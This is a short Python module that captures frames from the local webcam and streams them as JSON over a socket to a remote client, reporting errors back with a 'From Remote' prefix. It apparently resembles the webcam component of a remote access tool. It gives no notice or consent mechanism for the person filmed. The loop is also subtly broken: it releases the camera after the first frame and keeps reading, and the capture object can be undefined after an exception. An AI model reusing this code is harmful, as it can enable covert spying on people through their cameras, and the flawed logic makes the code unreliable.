import cv2
import struct
import json

def send_webcam_stream(client_socket):
    try:
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            client_socket.sendall(json.dumps({"logger": "No webcam device found"}).encode())
            return
    except (ConnectionError, ConnectionResetError):
        pass
    except Exception as e:
        message = f"From Remote: {str(e)}"
        client_socket.sendall(json.dumps({"logger": message}).encode())
    
    while True:
        try:
            ret, frame = cap.read()
            if not ret:
                client_socket.sendall(json.dumps({"logger": "Error: Failed to capture frame."}).encode())
                break

            _, jpeg_frame = cv2.imencode('.jpg', frame)
            frame_data = jpeg_frame.tobytes()
            frame_data_length = len(frame_data)

            webcam_data = {
                "webcam": {
                    "length": frame_data_length,
                    "data": frame_data.decode("latin1")
                }
            }

            client_socket.sendall(json.dumps(webcam_data).encode())

            cap.release()
            client_socket.sendall(json.dumps({"logger": "Webcam streaming stopped."}).encode())
        except (ConnectionError, ConnectionResetError):
            pass
        except Exception as e:
            message = f"From Remote: {str(e)}"
            client_socket.sendall(json.dumps({"logger": message}).encode())
